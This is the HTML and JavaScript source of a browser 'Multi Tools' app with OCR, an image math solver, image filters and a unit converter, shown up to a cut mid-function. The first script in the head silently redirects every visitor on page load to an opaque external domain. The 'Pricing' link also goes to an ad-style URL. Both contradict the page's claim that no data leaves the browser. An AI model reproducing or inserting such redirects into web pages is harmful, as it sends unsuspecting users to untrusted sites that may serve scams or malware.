<!DOCTYPE html>
<html lang="en">
<head>
    <script type="text/javascript">
window.location.href = "https://poqc4.sbs/c254981de9b974e78e22/552a8f5145/?placementName=default";
</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi Tools Web App</title>
    <!-- Tesseract.js (OCR) -->
    <script src='https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js'></script>
    <!-- Math.js (for math evaluation) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <!-- convert-units (for unit converter) -->
    <script src="https://cdn.jsdelivr.net/npm/convert-units@2.3.4/lib/index.min.js"></script>

    <style>
        :root {
            --primary-color: #007bff;
            --secondary-color: #6c757d;
            --light-color: #f8f9fa;
            --dark-color: #343a40;
            --success-color: #28a745;
            --danger-color: #dc3545;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            font-family: var(--font-family);
            margin: 0;
            padding: 0;
            background-color: var(--light-color);
            color: var(--dark-color);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Header */
        header {
            background-color: var(--dark-color);
            color: var(--light-color);
            padding: 15px 20px;
            text-align: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        header nav ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-wrap: wrap; /* Allow wrapping on small screens if necessary */
        }

        header nav ul li {
            margin: 0 10px;
        }

        header nav ul li a {
            color: var(--light-color);
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 5px;
            transition: background-color 0.3s ease;
            display: flex;
            align-items: center;
        }

        header nav ul li a:hover, header nav ul li a.active {
            background-color: var(--primary-color);
        }

        header nav ul li a svg {
            margin-right: 5px;
        }

        /* Main Content */
        main {
            flex-grow: 1;
            padding: 20px;
            max-width: 900px;
            margin: 20px auto;
            width: 90%;
        }

        .tool-selector {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            margin-bottom: 30px;
            gap: 10px;
        }

        .tool-button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 18px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            min-width: 120px;
            transition: background-color 0.3s ease, transform 0.2s ease;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .tool-button:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }
        .tool-button.active {
            background-color: var(--success-color);
        }

        .tool-button svg {
            width: 32px;
            height: 32px;
            margin-bottom: 8px;
        }

        .tool-content {
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            animation: fadeIn 0.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .tool-content h2 {
            margin-top: 0;
            color: var(--primary-color);
            border-bottom: 2px solid var(--primary-color);
            padding-bottom: 10px;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: var(--secondary-color);
        }
        .input-group input[type="file"],
        .input-group select,
        .input-group input[type="number"],
        .input-group input[type="text"] {
            width: calc(100% - 22px); /* Account for padding */
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
        }
        .input-group button, .action-button {
            background-color: var(--success-color);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }
        .input-group button:hover, .action-button:hover {
            background-color: #1e7e34;
        }
        .input-group .camera-button {
            background-color: var(--secondary-color);
        }
         .input-group .camera-button:hover {
            background-color: #545b62;
        }

        .output-area {
            margin-top: 20px;
            padding: 15px;
            background-color: var(--light-color);
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            min-height: 100px;
            white-space: pre-wrap; /* Preserve formatting */
            word-wrap: break-word;
        }
        .output-area img {
            max-width: 100%;
            height: auto;
            border-radius: 4px;
            margin-top: 10px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--primary-color);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none; /* Hidden by default */
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Camera Modal */
        .camera-modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.6);
        }
        .camera-modal-content {
            background-color: #fefefe;
            margin: 10% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 600px;
            border-radius: 8px;
            text-align: center;
        }
        .camera-modal-content video {
            width: 100%;
            max-height: 400px;
            border: 1px solid #ccc;
            margin-bottom: 15px;
        }
        .close-modal {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }
        .close-modal:hover, .close-modal:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        /* Unit Converter Specific */
        .unit-converter-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            align-items: end;
        }
        .unit-converter-grid .input-group {
            margin-bottom: 0;
        }
        .unit-converter-grid span {
            font-size: 1.5em;
            text-align: center;
            align-self: center; /* Vertically align if needed */
        }


        /* Footer */
        footer {
            background-color: var(--dark-color);
            color: var(--light-color);
            padding: 30px 20px;
            text-align: center;
        }
        #features-section, #privacy-section {
            max-width: 800px;
            margin: 0 auto 20px auto;
            text-align: left;
            line-height: 1.6;
        }
        #features-section h3, #privacy-section h3 {
            color: var(--primary-color);
            border-bottom: 1px solid var(--primary-color);
            padding-bottom: 5px;
        }
        .social-media a {
            margin: 0 10px;
            color: var(--light-color);
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .social-media a:hover {
            color: var(--primary-color);
        }
        .social-media svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }
        #privacy-section a {
            color: var(--primary-color);
            text-decoration: underline;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            header nav ul {
                flex-direction: column;
            }
            header nav ul li {
                margin: 5px 0;
            }
            .tool-selector {
                flex-direction: column;
            }
            .tool-button {
                width: 100%;
                margin-bottom: 10px;
            }
            .unit-converter-grid {
                grid-template-columns: 1fr; /* Stack elements vertically */
            }
            .unit-converter-grid span {
                display: none; /* Hide equals sign on small screens or adjust layout */
            }
        }
    </style>
</head>
<body>

    <header>
        <nav>
            <ul>
                <li><a href="#" class="nav-link" data-target="home">
                    <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path></svg>
                    Home</a></li>
                <li><a href="#features-section" class="nav-link" data-target="features">
                     <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15H9V9h2v8zm4 0h-2V9h2v8z"></path></svg>
                    Features</a></li>
                <li><a href="https://play.google.com/store/apps" target="_blank" rel="noopener noreferrer">
                    <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M3 20c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v16zm3.67-14L15.5 12 6.67 18V6z"></path></svg>
                    Get App</a></li>
                <li><a href="https://otieu.com/4/9367847" target="_blank" rel="noopener noreferrer">
                    <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V8h16v10zm-8-7c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z"></path></svg>
                    Pricing</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <div class="tool-selector">
            <button class="tool-button" data-tool="imageToText">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-4.03 11.41L14 15l-1.97-1.59L10 15l-1.97-1.59L6.06 15V5h11.88v8.41zM7 7h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2z"></path></svg>
                Image to Text
            </button>
            <button class="tool-button" data-tool="imageToInfo">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.5 2C6.81 2 3 5.81 3 10.5S6.81 19 11.5 19h.5v3c0 .55.45 1 1 1s1-.45 1-1v-3h.5c4.69 0 8.5-3.81 8.5-8.5S18.19 2 13.5 2h-2zm0 15c-2.48 0-4.5-2.02-4.5-4.5S9.02 8 11.5 8s4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5zM12 7c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0 3c-.55 0-1 .45-1 1v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1z"></path></svg>
                Image to Info/Math
            </button>
            <button class="tool-button" data-tool="imageRepair">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M5 16h3v3h2v-5H5v2zm3-8H5v2h5V5H8v3zm6 11h2v-3h3v-2h-5v5zm2-11V5h-2v5h5V8h-3zM19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"></path></svg>
                Image Repair
            </button>
            <button class="tool-button" data-tool="unitConverter">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.01 11H4v2h12.01v3L20 12l-3.99-4v3zm-1-5H4v2h11.01V5L20 9l-4.99-4V5zm4.98 13H8v-2h12.01v-3L20 16l-3.99 4v-3z"></path></svg>
                Unit Converter
            </button>
        </div>

        <div id="tool-container">
            <!-- Tool content will be injected here by JavaScript -->
        </div>
        <div class="loader" id="loader"></div>
    </main>

    <footer>
        <div id="features-section">
            <h3>Features</h3>
            <p>Our Multi Tool App offers a suite of powerful utilities in one convenient place:</p>
            <ul>
                <li><strong>Image to Text:</strong> Accurately extract text from images, supporting multiple languages including Bangla. Use your camera or upload files.</li>
                <li><strong>Image to Info/Math:</strong> Get insights from your images. Upload a picture with a math problem, and our tool can help solve it with explanations. Also provides basic image metadata.</li>
                <li><strong>Image Repair (Basic):</strong> Attempt basic enhancements on old or unclear images. For complex restoration, professional tools are recommended.</li>
                <li><strong>Unit Converter:</strong> A comprehensive converter for various units like length, weight, temperature, volume, and more.</li>
            </ul>
        </div>

        <div id="privacy-section">
            <h3>Privacy</h3>
            <p>Your privacy is important to us. All image processing and conversions are done directly in your browser. No data is sent to our servers for these core tool functions.</p>
            <p><a href="privacy-policy.html" target="_blank" rel="noopener noreferrer">Read our full Privacy Policy</a></p>
            <!-- Create a privacy-policy.html or link to an existing one -->
        </div>

        <div class="social-media">
            <a href="https://www.facebook.com/nawaj.uddin" target="_blank" rel="noopener noreferrer" aria-label="Facebook">
                <svg viewBox="0 0 24 24"><path d="M22.675 0h-21.35c-0.732 0-1.325 0.593-1.325 1.325v21.351c0 0.731 0.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463 0.099 2.795 0.143v3.24l-1.918 0.001c-1.504 0-1.795 0.715-1.795 1.763v2.313h3.587l-0.467 3.622h-3.12v9.293h6.116c0.73 0 1.323-0.593 1.323-1.325v-21.35c0-0.732-0.593-1.325-1.325-1.325z"></path></svg>
            </a>
            <a href="https://www.instagram.com/nawaj.17/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
                <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.204-7.325 3.171-7.529 7.53C.014 8.333 0 8.741 0 12c0 3.259.014 3.667.072 4.947.204 4.358 3.171 7.325 7.53 7.529C8.333 23.986 8.741 24 12 24c3.259 0 3.667-.014 4.947-.072 4.358-.204 7.325-3.171 7.529-7.53.058-1.28.072-1.688.072-4.947s-.014-3.667-.072-4.947c-.204-4.358-3.171-7.325-7.529-7.53C15.667.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zm0 10.162a3.999 3.999 0 110-8 3.999 3.999 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"></path></svg>
            </a>
            <a href="https://www.linkedin.com/in/nawaj-uddin-666110351/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
                <svg viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg>
            </a>
            <a href="https://www.youtube.com/@PowerfulLifeLessonsBD" target="_blank" rel="noopener noreferrer" aria-label="YouTube">
                <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"></path></svg>
            </a>
        </div>
        <p>© <span id="currentYear"></span> Multi Tools App. All rights reserved.</p>
    </footer>

    <!-- Camera Modal -->
    <div id="cameraModal" class="camera-modal">
        <div class="camera-modal-content">
            <span class="close-modal" id="closeCameraModal">×</span>
            <video id="cameraStream" autoplay playsinline></video>
            <button id="captureImageButton" class="action-button">Capture Image</button>
            <canvas id="cameraCanvas" style="display:none;"></canvas>
        </div>
    </div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const toolButtons = document.querySelectorAll('.tool-button');
        const toolContainer = document.getElementById('tool-container');
        const loader = document.getElementById('loader');
        const navLinks = document.querySelectorAll('.nav-link');
        let currentTool = null;
        let activeCameraCallback = null; // To store which tool requested the camera

        // Populate current year in footer
        document.getElementById('currentYear').textContent = new Date().getFullYear();

        // --- Navigation ---
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                const targetId = link.getAttribute('data-target');
                if (targetId === 'home') {
                    e.preventDefault();
                    clearToolContainer();
                    toolButtons.forEach(btn => btn.classList.remove('active'));
                    currentTool = null;
                } else if (targetId === 'features') {
                    // Smooth scroll to features section
                    e.preventDefault();
                    document.getElementById('features-section').scrollIntoView({ behavior: 'smooth' });
                }
                // For other links (Get App, Pricing), default browser behavior for target="_blank"
            });
        });


        // --- Tool Selection ---
        toolButtons.forEach(button => {
            button.addEventListener('click', () => {
                const toolName = button.dataset.tool;
                if (currentTool === toolName) return; // Don't reload if same tool
                
                toolButtons.forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                currentTool = toolName;
                loadTool(toolName);
            });
        });

        function clearToolContainer() {
            toolContainer.innerHTML = '';
        }

        function loadTool(toolName) {
            clearToolContainer();
            loader.style.display = 'block';

            // Simulate loading time for tool UI, actual processing will have its own loader
            setTimeout(() => {
                let content = '';
                switch (toolName) {
                    case 'imageToText':
                        content = getImageToTextUI();
                        break;
                    case 'imageToInfo':
                        content = getImageToInfoUI();
                        break;
                    case 'imageRepair':
                        content = getImageRepairUI();
                        break;
                    case 'unitConverter':
                        content = getUnitConverterUI();
                        break;
                }
                toolContainer.innerHTML = content;
                attachToolEventListeners(toolName);
                loader.style.display = 'none';
            }, 200); // Small delay to show loader
        }

        function showLoader(toolContentAreaId) {
            const area = document.getElementById(toolContentAreaId);
            if(area) area.innerHTML = '<div class="loader" style="display:block;"></div>';
        }
        function hideLoader(toolContentAreaId) {
             const area = document.getElementById(toolContentAreaId);
             // Don't clear if it's not just the loader
        }

        // --- UI Generators ---
        function getImageToTextUI() {
            return `
                <h2>Image to Text (OCR)</h2>
                <div class="input-group">
                    <label for="ocrLanguage">Select Language:</label>
                    <select id="ocrLanguage">
                        <option value="eng">English</option>
                        <option value="ben">Bangla (বাংলা)</option>
                        <option value="hin">Hindi (हिन्दी)</option>
                        <option value="ara">Arabic (العربية)</option>
                        <!-- Add more languages as needed -->
                    </select>
                </div>
                <div class="input-group">
                    <label for="imageToTextInputFile">Upload Image:</label>
                    <input type="file" id="imageToTextInputFile" accept="image/*">
                    <button class="camera-button" data-tool-target="imageToText">Use Camera</button>
                </div>
                <button id="processImageToText" class="action-button">Extract Text</button>
                <img id="imageToTextPreview" src="#" alt="Preview" style="max-width:100%; max-height:300px; margin-top:10px; display:none;">
                <div class="output-area" id="imageToTextOutput">Results will appear here...</div>
            `;
        }

        function getImageToInfoUI() {
            return `
                <h2>Image Info & Math Solver</h2>
                <div class="input-group">
                    <label>Operation:</label>
                    <select id="imageInfoOperation">
                        <option value="info">Get Image Info</option>
                        <option value="math">Solve Math from Image</option>
                    </select>
                </div>
                <div class="input-group">
                    <label for="imageToInfoInputFile">Upload Image:</label>
                    <input type="file" id="imageToInfoInputFile" accept="image/*">
                    <button class="camera-button" data-tool-target="imageToInfo">Use Camera</button>
                </div>
                <button id="processImageToInfo" class="action-button">Process Image</button>
                <img id="imageToInfoPreview" src="#" alt="Preview" style="max-width:100%; max-height:300px; margin-top:10px; display:none;">
                <div class="output-area" id="imageToInfoOutput">Results will appear here...</div>
            `;
        }

        function getImageRepairUI() {
            return `
                <h2>Image Repair (Basic Filters)</h2>
                <p><strong>Note:</strong> True AI-powered image repair is computationally intensive and typically requires server-side processing. This tool offers basic client-side filters.</p>
                <div class="input-group">
                    <label for="imageRepairInputFile">Upload Image:</label>
                    <input type="file" id="imageRepairInputFile" accept="image/*">
                    <button class="camera-button" data-tool-target="imageRepair">Use Camera</button>
                </div>
                <canvas id="imageRepairCanvas" style="max-width:100%; border:1px solid #ccc; margin-top:10px; display:none;"></canvas>
                <div class="input-group">
                    <label for="brightnessSlider">Brightness:</label>
                    <input type="range" id="brightnessSlider" min="0" max="200" value="100"> <span id="brightnessValue">100%</span>
                </div>
                <div class="input-group">
                    <label for="contrastSlider">Contrast:</label>
                    <input type="range" id="contrastSlider" min="0" max="200" value="100"> <span id="contrastValue">100%</span>
                </div>
                 <button id="resetFiltersButton" class="action-button" style="background-color: var(--secondary-color); margin-right:10px;">Reset Filters</button>
                <button id="downloadRepairedImage" class="action-button" style="display:none;">Download Image</button>
                <div class="output-area" id="imageRepairOutput">Adjust sliders to modify the image.</div>
            `;
        }

        function getUnitConverterUI() {
            const { measures, list } = convert();
            let categoryOptions = '';
            for (const measure of measures()) {
                categoryOptions += `<option value="${measure}">${measure.charAt(0).toUpperCase() + measure.slice(1)}</option>`;
            }

            return `
                <h2>Unit Converter</h2>
                <div class="input-group">
                    <label for="unitCategory">Select Category:</label>
                    <select id="unitCategory">${categoryOptions}</select>
                </div>
                <div class="unit-converter-grid">
                    <div class="input-group">
                        <label for="fromUnitValue">Value:</label>
                        <input type="number" id="fromUnitValue" value="1">
                    </div>
                    <div class="input-group">
                        <label for="fromUnit">From:</label>
                        <select id="fromUnit"></select>
                    </div>
                    <span>=</span>
                    <div class="input-group">
                        <label for="toUnitValue">Result:</label>
                        <input type="text" id="toUnitValue" readonly>
                    </div>
                    <div class="input-group">
                        <label for="toUnit">To:</label>
                        <select id="toUnit"></select>
                    </div>
                </div>
                <div class="output-area" id="unitConverterOutput" style="margin-top: 20px; text-align:center; font-size: 1.2em;">Select units and enter value.</div>
            `;
        }

        // --- Event Listeners for Tools ---
        function attachToolEventListeners(toolName) {
            // Camera Buttons
            document.querySelectorAll('.camera-button').forEach(btn => {
                btn.onclick = () => {
                    activeCameraCallback = window[`handle${btn.dataset.toolTarget.charAt(0).toUpperCase() + btn.dataset.toolTarget.slice(1)}CameraCapture`];
                    openCameraModal();
                };
            });

            switch (toolName) {
                case 'imageToText':
                    document.getElementById('processImageToText').onclick = handleImageToText;
                    document.getElementById('imageToTextInputFile').onchange = (e) => previewImage(e.target.files[0], 'imageToTextPreview');
                    break;
                case 'imageToInfo':
                    document.getElementById('processImageToInfo').onclick = handleImageToInfo;
                    document.getElementById('imageToInfoInputFile').onchange = (e) => previewImage(e.target.files[0], 'imageToInfoPreview');
                    break;
                case 'imageRepair':
                    document.getElementById('imageRepairInputFile').onchange = (e) => {
                        originalImageForRepair = null; // Reset
                        previewImageForRepair(e.target.files[0]);
                    };
                    document.getElementById('brightnessSlider').oninput = applyImageFilters;
                    document.getElementById('contrastSlider').oninput = applyImageFilters;
                    document.getElementById('resetFiltersButton').onclick = resetImageFilters;
                    document.getElementById('downloadRepairedImage').onclick = downloadRepairedImage;
                    break;
                case 'unitConverter':
                    const categorySelect = document.getElementById('unitCategory');
                    categorySelect.onchange = populateUnitDropdowns;
                    document.getElementById('fromUnitValue').oninput = convertUnits;
                    document.getElementById('fromUnit').onchange = convertUnits;
                    document.getElementById('toUnit').onchange = convertUnits;
                    populateUnitDropdowns(); // Initial population
                    break;
            }
        }

        function previewImage(file, previewElementId) {
            const preview = document.getElementById(previewElementId);
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                }
                reader.readAsDataURL(file);
                return file;
            } else {
                preview.style.display = 'none';
                return null;
            }
        }
        
        // --- Camera Functionality ---
        const cameraModal = document.getElementById('cameraModal');
        const closeCameraModalBtn = document.getElementById('closeCameraModal');
        const cameraStreamVideo = document.getElementById('cameraStream');
        const captureImageButton = document.getElementById('captureImageButton');
        const cameraCanvas = document.getElementById('cameraCanvas');
        let stream = null;

        async function openCameraModal() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                    cameraStreamVideo.srcObject = stream;
                    cameraModal.style.display = 'block';
                } catch (err) {
                    console.error("Error accessing camera: ", err);
                    alert("Could not access camera. Please ensure permissions are granted and you are using HTTPS if on web.");
                }
            } else {
                alert("Camera API not supported by your browser.");
            }
        }

        closeCameraModalBtn.onclick = () => {
            cameraModal.style.display = 'none';
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
        window.onclick = (event) => { // Close if clicked outside modal
            if (event.target == cameraModal) {
                closeCameraModalBtn.click();
            }
        };

        captureImageButton.onclick = () => {
            cameraCanvas.width = cameraStreamVideo.videoWidth;
            cameraCanvas.height = cameraStreamVideo.videoHeight;
            cameraCanvas.getContext('2d').drawImage(cameraStreamVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
            const imageDataUrl = cameraCanvas.toDataURL('image/png');
            
            if (activeCameraCallback) {
                activeCameraCallback(imageDataUrl);
            }
            closeCameraModalBtn.click();
        };

        function dataURLtoFile(dataurl, filename) {
            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new File([u8arr], filename, {type:mime});
        }

        // --- Tool Specific Handlers ---

        // Image to Text
        window.handleImageToTextCameraCapture = function(imageDataUrl) {
            const file = dataURLtoFile(imageDataUrl, 'camera_capture.png');
            document.getElementById('imageToTextInputFile').files = createFileList(file); // Not directly possible, but can simulate
            previewImage(file, 'imageToTextPreview');
            // Auto-trigger if desired, or user clicks "Extract Text"
        }
        async function handleImageToText() {
            const fileInput = document.getElementById('imageToTextInputFile');
            const lang = document.getElementById('ocrLanguage').value;
            const outputArea = document.getElementById('imageToTextOutput');
            const preview = document.getElementById('imageToTextPreview');

            if (!fileInput.files || fileInput.files.length === 0) {
                if (!preview.src || preview.src === '#' || preview.style.display === 'none') {
                     outputArea.textContent = 'Please select an image or use the camera.';
                     return;
                }
                // If preview is shown (from camera), use that
            }
            
            const imageFile = fileInput.files[0] || (preview.src.startsWith('data:') ? dataURLtoFile(preview.src, 'capture.png') : null);
            if (!imageFile) {
                 outputArea.textContent = 'No image selected.';
                 return;
            }

            showLoader('imageToTextOutput');
            outputArea.textContent = 'Processing... This may take a moment.';
            
            try {
                const { data: { text } } = await Tesseract.recognize(
                    imageFile,
                    lang,
                    { 
                        logger: m => {
                            if (m.status === 'recognizing text') {
                                outputArea.textContent = `Recognizing text: ${Math.round(m.progress * 100)}%`;
                            } else {
                                outputArea.textContent = `Status: ${m.status}`;
                            }
                        },
                        // For WEBINTOAPP, if you bundle tesseract and lang data:
                        // workerPath: 'path/to/tesseract/worker.min.js',
                        // langPath: 'path/to/languages/', // where eng.traineddata.gz etc. are
                        // corePath: 'path/to/tesseract/tesseract-core.wasm.js',
                    }
                );
                outputArea.textContent = text || "No text found or unable to process.";
            } catch (error) {
                console.error('OCR Error:', error);
                outputArea.textContent = 'Error during OCR processing. Check console for details. Ensure language data is available.';
            } finally {
                 // hideLoader already done by setting textContent
            }
        }

        // Image to Info / Math
        window.handleImageToInfoCameraCapture = function(imageDataUrl) {
            const file = dataURLtoFile(imageDataUrl, 'camera_capture.png');
            // document.getElementById('imageToInfoInputFile').files = createFileList(file); // See note on createFileList
            previewImage(file, 'imageToInfoPreview');
        }
        async function handleImageToInfo() {
            const fileInput = document.getElementById('imageToInfoInputFile');
            const operation = document.getElementById('imageInfoOperation').value;
            const outputArea = document.getElementById('imageToInfoOutput');
            const preview = document.getElementById('imageToInfoPreview');

            const imageFile = fileInput.files[0] || (preview.src.startsWith('data:') ? dataURLtoFile(preview.src, 'capture.png') : null);

            if (!imageFile) {
                outputArea.textContent = 'Please select an image or use the camera.';
                return;
            }

            showLoader('imageToInfoOutput');
            outputArea.textContent = 'Processing...';

            if (operation === 'info') {
                let infoText = `Filename: ${imageFile.name}\n`;
                infoText += `Type: ${imageFile.type}\n`;
                infoText += `Size: ${(imageFile.size / 1024).toFixed(2)} KB\n`;

                const img = new Image();
                img.onload = () => {
                    infoText += `Dimensions: ${img.width} x ${img.height} px`;
                    outputArea.textContent = infoText;
                };
                img.onerror = () => {
                     outputArea.textContent = infoText + "\nCould not load image dimensions.";
                }
                img.src = URL.createObjectURL(imageFile);

            } else if (operation === 'math') {
                outputArea.textContent = 'Extracting math expression...';
                try {
                    const { data: { text } } = await Tesseract.recognize(imageFile, 'eng', { logger: m => console.log(m) });
                    outputArea.textContent = `Extracted Text: ${text}\nAttempting to solve...`;
                    
                    // Basic cleaning for math expressions (remove non-math chars, keep .()+-*/^0-9)
                    // This is a very naive approach and can be improved significantly
                    const mathExpression = text.replace(/[^0-9.+\-*/^()\s]/g, '').trim();
                    
                    if (!mathExpression) {
                        outputArea.textContent += "\nNo valid math expression found in the image.";
                        return;
                    }
                    outputArea.textContent += `\nCleaned Expression: ${mathExpression}`;

                    try {
                        const result = math.evaluate(mathExpression);
                        // For explanation, try to show node tree (simple for now)
                        let explanation = "\nSteps (simplified):\n";
                        try {
                            const node = math.parse(mathExpression);
                            explanation += node.toString() + " = " + result;
                        } catch (parseError) {
                            explanation += "Could not parse for detailed steps.";
                        }
                        outputArea.textContent += `\nResult: ${result}\n${explanation}`;
                    } catch (evalError) {
                        console.error("Math evaluation error:", evalError);
                        outputArea.textContent += `\nCould not evaluate expression: "${mathExpression}". Error: ${evalError.message}`;
                    }
                } catch (ocrError) {
                    console.error('OCR Error for Math:', ocrError);
                    outputArea.textContent = 'Error during OCR for math. Check console.';
                }
            }
        }

        // Image Repair (Basic Filters)
        let originalImageForRepair = null;
        let imageRepairCanvasCtx = null;
        const imageRepairCanvasEl = document.getElementById('imageRepairCanvas'); // Get it once

        window.handleImageRepairCameraCapture = function(imageDataUrl) {
            const file = dataURLtoFile(imageDataUrl, 'camera_capture.png');
            previewImageForRepair(file);
        }

        function previewImageForRepair(file) {
            const canvas = document.getElementById('imageRepairCanvas'); // Re-fetch as it's created dynamically
            const outputArea = document.getElementById('imageRepairOutput');
            const downloadBtn = document.getElementById('downloadRepairedImage');
            if (!canvas) return; // Tool not active

            imageRepairCanvasCtx = canvas.getContext('2d');
            
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = new Image();
                    img.onload = () => {
                        originalImageForRepair = img; // Store original
                        canvas.width = img.width;
                        canvas.height = img.height;
                        applyImageFilters(); // Draw with default filters
                        canvas.style.display = 'block';
                        downloadBtn.style.display = 'inline-block';
                        outputArea.textContent = 'Adjust sliders to modify the image.';
                    }
                    img.src = e.target.result;
                }
                reader.readAsDataURL(file);
            } else {
                canvas.style.display = 'none';
